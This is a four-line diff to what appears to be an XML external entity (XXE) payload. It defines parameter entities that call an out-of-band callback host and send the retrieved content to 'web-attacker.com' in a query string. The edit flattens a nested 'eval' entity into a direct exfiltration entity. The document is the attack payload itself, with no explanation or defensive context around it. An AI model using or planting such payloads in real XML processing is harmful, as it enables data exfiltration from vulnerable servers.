@@ -1,4 +1,3 @@
 <!ENTITY % file SYSTEM "http://vmylefbsizgaxwlhdsjz527jnl30ygpz6.oast.fun">
-<!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
-%eval;
+<!ENTITY % exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>
 %exfiltrate;
